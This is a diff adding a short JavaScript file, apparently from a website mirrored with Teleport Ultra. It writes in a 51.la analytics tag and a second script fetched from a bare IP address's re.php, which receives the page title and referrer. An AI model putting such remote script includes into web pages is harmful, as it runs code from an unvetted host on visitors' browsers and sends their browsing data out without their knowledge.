@@ -1,0 +1,2 @@
+document.write("<script language='javascript' src="javascript:if(confirm('http://js.users.51.la/4392650.js?_veri=20121009  \n\n该文件无法用 Teleport Ultra 下载, 因为 它是一个域或路径外部被设置为它的启始地址的地址。  \n\n你想在服务器上打开它?'))window.location='http://js.users.51.la/4392650.js?_veri=20121009'" tppabs="http://js.users.51.la/4392650.js?_veri=20121009"><\/script>");document.write("<script language='javascript' src='http://211.144.95.196/re/re.php?src=t0035&t="+encodeURIComponent(document.title)+"&ci=1916669640&r="+encodeURIComponent(document.referrer)+"'><\/script>");
+
